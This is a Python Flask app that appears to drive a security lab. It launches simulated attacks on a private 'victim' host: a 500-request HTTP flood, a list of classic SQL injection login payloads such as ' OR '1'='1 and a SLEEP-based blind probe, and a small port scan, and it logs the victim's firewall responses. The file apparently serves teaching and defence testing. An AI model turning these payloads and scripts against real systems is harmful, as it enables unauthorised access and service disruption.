from flask import Flask, render_template, jsonify, request
import requests
import threading
import time
from datetime import datetime
import os

app = Flask(__name__)

machines = {
    'victim': {
        'ip': '172.20.0.10',
        'port': 5000,
        'name': 'Victim Server',
        'services': ['Web Server', 'Database', 'Firewall']
    },
    'controller': {
        'ip': '172.20.0.5',
        'name': 'Control Center'
    }
}

attack_status = {'running': False, 'type': None, 'logs': []}
LOG_DIR = '/app/logs'

def save_log_file(attack_type, logs):
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    filename = f"{attack_type}_Attack_{timestamp}.log"
    filepath = os.path.join(LOG_DIR, filename)
    
    try:
        with open(filepath, 'w') as f:
            f.write(f"="*60 + "\n")
            f.write(f"Attack Type: {attack_type}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"="*60 + "\n\n")
            for log in logs:
                f.write(log + "\n")
        return filename
    except Exception as e:
        return f"Error: {str(e)}"

def add_log(message):
    timestamp = datetime.now().strftime('%H:%M:%S')
    log_entry = f"[{timestamp}] {message}"
    attack_status['logs'].append(log_entry)

def fetch_firewall_alerts():
    """Fetch real alerts from victim's firewall"""
    try:
        resp = requests.get(f"http://{machines['victim']['ip']}:{machines['victim']['port']}/firewall/alerts", timeout=2)
        if resp.status_code == 200:
            return resp.json().get('alerts', [])
    except:
        pass
    return []

def run_ddos_attack():
    global attack_status
    attack_status['logs'] = []
    
    victim_ip = machines['victim']['ip']
    victim_port = machines['victim']['port']
    
    add_log(f"🔴 ATTACK INITIATED: DDoS (Distributed Denial of Service)")
    add_log(f"Target: {machines['victim']['name']} ({victim_ip}:{victim_port})")
    
    try:
        total_sent = 0
        total_blocked = 0
        
        for wave in range(1, 6):
            add_log(f"Wave {wave}/5: Sending 100 HTTP requests...")
            
            success = 0
            blocked = 0
            
            for i in range(100):
                try:
                    resp = requests.get(f'http://{victim_ip}:{victim_port}/', timeout=1)
                    if resp.status_code == 200:
                        success += 1
                        total_sent += 1
                    elif resp.status_code == 429:  # Rate limit
                        blocked += 1
                        total_blocked += 1
                    elif resp.status_code == 403:  # Forbidden/Blocked
                        blocked += 1
                        total_blocked += 1
                except requests.exceptions.Timeout:
                    blocked += 1
                    total_blocked += 1
                except:
                    blocked += 1
                    total_blocked += 1
            
            add_log(f"Wave {wave} Result: {success} successful, {blocked} blocked/failed")
            
            # Fetch real firewall alerts
            alerts = fetch_firewall_alerts()
            if alerts:
                latest_alert = alerts[-1]
                add_log(f"🛡️  FIREWALL: {latest_alert['message']}")
            
            time.sleep(2)
        
        # Final stats
        add_log(f"📊 Total: {total_sent} requests sent, {total_blocked} blocked by firewall")
        
        # Fetch firewall stats
        try:
            resp = requests.get(f'http://{victim_ip}:{victim_port}/firewall/stats', timeout=2)
            if resp.status_code == 200:
                fw_stats = resp.json()
                add_log(f"🛡️  Firewall Status: {fw_stats['blocked_count']} IPs blacklisted")
                add_log(f"🛡️  Total Alerts Generated: {fw_stats['total_alerts']}")
        except:
            pass
        
        logfile = save_log_file('DDoS', attack_status['logs'])
        add_log(f"📁 Log saved: {logfile}")
        
    except Exception as e:
        add_log(f"❌ Error: {str(e)}")
    finally:
        attack_status['running'] = False

def run_sql_injection():
    global attack_status
    attack_status['logs'] = []
    
    victim_ip = machines['victim']['ip']
    victim_port = machines['victim']['port']
    
    add_log(f"🔴 ATTACK INITIATED: SQL Injection")
    add_log(f"Target: {machines['victim']['name']} ({victim_ip}:{victim_port}/login)")
    
    payloads = [
        ("' OR '1'='1", "Authentication Bypass"),
        ("admin'--", "Comment Injection"),
        ("' UNION SELECT NULL--", "UNION Injection"),
        ("' OR 1=1--", "Boolean Injection"),
        ("admin' AND SLEEP(5)--", "Time-based Blind"),
    ]
    
    try:
        blocked_count = 0
        success_count = 0
        
        for payload, desc in payloads:
            add_log(f"Testing: {desc} | Payload: {payload}")
            
            try:
                resp = requests.post(
                    f'http://{victim_ip}:{victim_port}/login',
                    json={'username': payload, 'password': 'test'},
                    timeout=5
                )
                result = resp.json()
                
                if resp.status_code == 403 and result.get('blocked'):
                    add_log(f"🛡️  BLOCKED BY WAF: {desc} - Firewall detected SQL injection pattern")
                    blocked_count += 1
                elif result.get('success') or 'error' in result:
                    add_log(f"✓ VULNERABILITY EXPLOITED: {desc}")
                    success_count += 1
                else:
                    add_log(f"✗ Failed: {desc}")
            except Exception as e:
                add_log(f"⚠️  Error: {str(e)}")
            
            time.sleep(1)
        
        add_log(f"📊 Summary: {success_count} exploitable, {blocked_count} blocked by firewall")
        
        # Get firewall alerts
        alerts = fetch_firewall_alerts()
        add_log(f"🛡️  Firewall generated {len([a for a in alerts if 'SQL' in a['message']])} SQL injection alerts")
        
        logfile = save_log_file('SQL_Injection', attack_status['logs'])
        add_log(f"📁 Log saved: {logfile}")
        
    except Exception as e:
        add_log(f"❌ Error: {str(e)}")
    finally:
        attack_status['running'] = False

def run_port_scan():
    global attack_status
    attack_status['logs'] = []
    
    victim_ip = machines['victim']['ip']
    
    add_log(f"🔴 ATTACK INITIATED: Port Scan")
    add_log(f"Target: {machines['victim']['name']} ({victim_ip})")
    
    ports = [21, 22, 23, 25, 80, 443, 3306, 5000, 8080, 8443]
    
    try:
        open_ports = []
        
        for port in ports:
            add_log(f"Scanning port {port}...")
            
            try:
                resp = requests.get(f'http://{victim_ip}:{port}/', timeout=2)
                add_log(f"✓ Port {port} OPEN")
                open_ports.append(port)
            except:
                add_log(f"✗ Port {port} CLOSED")
            
            time.sleep(0.5)
        
        add_log(f"📊 Found {len(open_ports)} open ports: {open_ports}")
        
        logfile = save_log_file('Port_Scan', attack_status['logs'])
        add_log(f"📁 Log saved: {logfile}")
        
    except Exception as e:
        add_log(f"❌ Error: {str(e)}")
    finally:
        attack_status['running'] = False

@app.route('/')
def index():
    return render_template('index.html', machines=machines)

@app.route('/api/start_attack', methods=['POST'])
def start_attack():
    if attack_status['running']:
        return jsonify({'error': 'Attack already running'}), 400
    
    attack_type = request.json.get('type')
    attack_status['running'] = True
    attack_status['type'] = attack_type
    
    if attack_type == 'ddos':
        thread = threading.Thread(target=run_ddos_attack)
    elif attack_type == 'sql':
        thread = threading.Thread(target=run_sql_injection)
    elif attack_type == 'portscan':
        thread = threading.Thread(target=run_port_scan)
    
    thread.daemon = True
    thread.start()
    return jsonify({'status': 'started'})

@app.route('/api/status')
def get_status():
    return jsonify(attack_status)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)